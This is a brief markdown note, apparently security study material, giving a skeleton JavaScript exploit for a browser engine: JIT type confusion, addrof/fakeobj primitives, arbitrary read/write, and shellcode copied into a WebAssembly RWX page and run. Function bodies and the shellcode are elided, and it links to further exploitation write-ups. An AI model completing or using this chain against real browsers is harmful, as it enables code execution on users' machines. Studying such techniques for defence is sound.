# WebAssembly Exploitation Example

The following code demonstrates an example of WebAssembly exploitation through JavaScript. It leverages vulnerabilities to execute shellcode in the context of the current process.

```javascript
// Define WebAssembly module
var wasm_code = new Uint8Array([...]); // Raw WebAssembly bytecode
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

// Memory buffers
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
let buf2 = new ArrayBuffer(0x150);

// Conversion functions
function ftoi(val) { ... }
function itof(val) { ... }

// Arrays and functions
const _arr = new Uint32Array([2**31]);
function foo(a) { ... }
for(var i=0;i<0x3000;++i) foo(true);
var x = foo(false);
var arr = x[0];
var cor = x[1];

// Memory manipulation functions
function addrof(k) { ... }
function fakeobj(k) { ... }

// Exploiting
var float_array_map = ftoi(cor[3]);
var arr2 = [itof(float_array_map), 1.2, 2.3, 3.4];
var fake = fakeobj(addrof(arr2) + 0x20n);

// Memory read and write functions
function arbread(addr) { ... }
function arbwrite(addr, val) { ... }
function copy_shellcode(addr, shellcode) { ... }

// Execution
var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + 0x68n));
console.log("[+] Address of rwx page: " + rwx_page_addr.toString(16));
var shellcode = [...]; // Shellcode array
copy_shellcode(rwx_page_addr, shellcode);
f();

## you can also follow [chrome-sbx-db](https://github.com/allpaca/chrome-sbx-db).
## you can also read this article [CVE-2020-0041](https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/).
